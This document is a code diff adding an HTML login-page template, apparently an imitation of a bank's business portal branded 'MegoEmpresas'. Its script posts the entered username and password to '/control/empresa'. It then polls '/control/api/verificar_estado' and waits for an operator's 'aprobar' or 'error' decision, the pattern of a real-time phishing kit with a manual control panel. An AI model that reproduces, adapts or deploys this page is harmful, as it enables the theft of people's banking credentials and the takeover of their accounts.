@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Empresa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="icon" href="{{ url_for('static', filename='images/favicon.png') }}" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            width: 100vw;
+            height: 100vh;
+            background: #ffffff;
+            display: flex;
+            overflow: hidden;
+            position: relative;
+        }
+
+        /* Lado Izquierdo: Panel Morado con Tarjeta Interactiva */
+        .left-banner {
+            flex: 1;
+            background: #7b2cbf; /* Tono morado corporativo */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            position: relative;
+        }
+
+        .promo-card {
+            width: 100%;
+            max-width: 520px;
+            height: 420px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 40px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            color: #fff;
+        }
+
+        .promo-content {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .promo-content h3 {
+            font-size: 22px;
+            font-weight: 600;
+        }
+
+        .promo-content p {
+            font-size: 14px;
+            line-height: 1.5;
+            opacity: 0.9;
+        }
+
+        .promo-link {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+            margin-top: 5px;
+        }
+        .promo-link:hover {
+            text-decoration: underline;
+        }
+
+        .dots-container {
+            display: flex;
+            gap: 8px;
+        }
+        .dot {
+            width: 8px;
+            height: 8px;
+            background: rgba(255, 255, 255, 0.4);
+            border-radius: 50%;
+        }
+        .dot.active {
+            background: #fff;
+            width: 20px;
+            border-radius: 4px;
+        }
+
+        .banner-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .btn-banner {
+            background: #fff;
+            color: #333;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 20px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            transition: transform 0.2s;
+        }
+        .btn-banner:hover {
+            transform: translateY(-2px);
+        }
+
+        /* Lado Derecho: Formulario de Login */
+        .right-form-container {
+            flex: 1;
+            background: #ffffff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px;
+            position: relative;
+        }
+
+        .form-box {
+            width: 100%;
+            max-width: 400px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .logo-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #7b2cbf;
+            margin-bottom: 35px;
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1.5px solid #dcd6f7;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #333;
+            outline: none;
+            background: #fff;
+            transition: border-color 0.3s;
+        }
+        .form-input:focus {
+            border-color: #7b2cbf;
+        }
+
+        .eye-icon {
+            position: absolute;
+            right: 15px;
+            top: 42px;
+            cursor: pointer;
+            color: #7b2cbf;
+        }
+
+        .link-sub {
+            font-size: 12px;
+            color: #7b2cbf;
+            text-decoration: none;
+            display: inline-block;
+            margin-top: 5px;
+        }
+        .link-sub:hover {
+            text-decoration: underline;
+        }
+
+        .error-message {
+            color: #e53935;
+            font-size: 12px;
+            margin-top: -12px;
+            margin-bottom: 10px;
+            display: none;
+        }
+
+        .btn-continuar {
+            width: 100%;
+            padding: 13px;
+            background: #e0e0e0;
+            border: none;
+            border-radius: 8px;
+            font-size: 15px;
+            font-weight: 600;
+            color: #fff;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: background 0.3s;
+        }
+        .btn-continuar.active {
+            background: #6220a2;
+        }
+        .btn-continuar.active:hover {
+            background: #7b2cbf;
+        }
+
+        .form-footer-info {
+            text-align: center;
+            margin-top: 40px;
+            font-size: 11px;
+            color: #888;
+            letter-spacing: 0.5px;
+        }
+.loading-container {
+    display: none;
+    justify-content: center;
+    align-items: center;
+    gap: 8px;
+    width: 100%;
+    padding: 13px;
+    margin-top: 15px;
+}
+.loading-dot {
+    width: 10px;
+    height: 10px;
+    background-color: #7b2cbf;
+    border-radius: 50%;
+    animation: bounce 1.4s infinite ease-in-out both;
+}
+.loading-dot:nth-child(1) { animation-delay: -0.32s; }
+.loading-dot:nth-child(2) { animation-delay: -0.16s; }
+
+@keyframes bounce {
+    0%, 80%, 100% { transform: scale(0); }
+    40% { transform: scale(1.0); }
+}
+        /* ========================================== */
+        /* DISEÑO RESPONSIVO / MÓVIL                  */
+        /* ========================================== */
+        @media screen and (max-width: 768px) {
+            body {
+                flex-direction: column;
+                overflow: auto;
+                height: auto;
+                min-height: 100vh;
+            }
+
+            /* Ocultar el banner izquierdo decorativo en celulares para limpiar espacio */
+            .left-banner {
+                display: none;
+            }
+
+            .right-form-container {
+                width: 100%;
+                min-height: 100vh;
+                padding: 30px 20px;
+                justify-content: flex-start;
+            }
+
+            .form-box {
+                max-width: 100%;
+                margin-top: 20px;
+            }
+
+            .logo-title {
+                text-align: center;
+                font-size: 24px;
+                margin-bottom: 25px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Lado Izquierdo (PC) -->
+    <div class="left-banner">
+        <div class="promo-card">
+            <div class="promo-content">
+                <h3>¿Qué puedo hacer en MegoEmpresas?</h3>
+                <p>Cambia tus horarios fácilmente a solo un click, no es necesario ir hasta la sucursal.</p>
+                <a href="#" class="promo-link">Más información <i class="fa-solid fa-chevron-right" style="font-size: 10px;"></i></a>
+            </div>
+            <div>
+                                <img src="{{ url_for('static', filename='images/bille.png') }}" alt="">
+
+                <div class="dots-container" style="margin-bottom: 25px;">
+                    <div class="dot active"></div>
+                    <div class="dot"></div>
+                </div>
+                <div class="banner-buttons">
+                    <button class="btn-banner">Consejos de seguridad</button>
+                    <button class="btn-banner">Contactar un asesor</button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Lado Derecho: Formulario (PC y Móvil) -->
+    <div class="right-form-container">
+        <div class="form-box">
+            <img src="{{ url_for('static', filename='images/empresa.png') }}" alt="empre">
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label class="form-label" >Usuario</label>
+                    <input type="text" id="id-empleado" class="form-input" placeholder="Ingresa tu usuario" required>
+                    <a href="#" class="link-sub">Olvidé mi usuario</a>
+                </div>
+
+                <div class="form-group">
+                    <label class="form-label">Contraseña</label>
+                    <input type="password" id="password" class="form-input" placeholder="Ingresa tu contraseña" required>
+                    <i class="fa-regular fa-eye eye-icon" id="togglePassword"></i>
+                    <a href="#" class="link-sub">Olvidé mi contraseña</a>
+                </div>
+
+                            <div id="error-box" class="error-message">Usuario o contraseña incorrectos.</div>
+
+
+<!-- Cambia type="submit" por type="button" -->
+<button type="button" id="btn-continuar" class="btn-continuar">Iniciar sesión</button>
+
+</form>
+ <div id="inline-loader" class="loading-container">
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+                <div class="loading-dot"></div>
+            </div>
+            <div class="form-footer-info">
+                SEGURIDAD Y PRIVACIDAD
+            </div>
+        </div>
+    </div>
+
+   <script>
+        const inputId = document.getElementById('id-empleado');
+        const inputPass = document.getElementById('password');
+        const btnContinuar = document.getElementById('btn-continuar');
+        const inlineLoader = document.getElementById('inline-loader');
+        const errorBox = document.getElementById('error-box');
+        const passwordInput = document.getElementById('password');
+        const eyeIcon = document.querySelector('.eye-icon');
+
+        function validateForm() {
+            if (inputId.value.trim().length > 0 && inputPass.value.trim().length > 0) {
+                btnContinuar.classList.add('active');
+            } else {
+                btnContinuar.classList.remove('active');
+            }
+        }
+
+        inputId.addEventListener('input', validateForm);
+        inputPass.addEventListener('input', validateForm);
+
+        if (eyeIcon && passwordInput) {
+            eyeIcon.addEventListener('click', () => {
+                const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+                passwordInput.setAttribute('type', type);
+            });
+        }
+
+        let intervaloVerificacion = null;
+
+        btnContinuar.addEventListener('click', function() {
+            if (!btnContinuar.classList.contains('active')) return;
+
+            const userVal = inputId.value.trim();
+            const passVal = inputPass.value.trim();
+            
+            // Ocultar botón y mostrar loader de carga
+            btnContinuar.style.display = 'none';
+            inlineLoader.style.display = 'flex';
+            errorBox.style.display = 'none';
+
+            fetch('/control/empresa', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ id_empleado: userVal, password: passVal })
+            })
+            .then(response => response.json())
+            .then(data => {
+                esperarDecisionPanel();
+            })
+            .catch(error => {
+                inlineLoader.style.display = 'none';
+                btnContinuar.style.display = 'block';
+                console.error('Error en la petición:', error);
+            });
+        });
+
+       function esperarDecisionPanel() {
+            if (intervaloVerificacion) clearInterval(intervaloVerificacion);
+
+            intervaloVerificacion = setInterval(() => {
+                fetch('/control/api/verificar_estado')
+                .then(res => res.json())
+                .then(data => {
+                    // Verificamos tanto 'siguiente' como 'siguiente_url' para evitar fallos
+                    const destino = data.siguiente || data.siguiente_url;
+                    
+                    if (data.decision === 'aprobar' && destino) {
+                        clearInterval(intervaloVerificacion);
+                        window.location.href = destino; 
+                    } else if (data.decision === 'error') {
+                        clearInterval(intervaloVerificacion);
+                        inlineLoader.style.display = 'none';
+                        btnContinuar.style.display = 'block';
+                        errorBox.style.display = "block";
+                        errorBox.innerText = "Usuario o contraseña incorrectos / Denegado.";
+                    }
+                })
+                .catch(err => console.error("Error verificando estado:", err));
+            }, 2000);
+        }
+    </script>
+</body>
+</html>
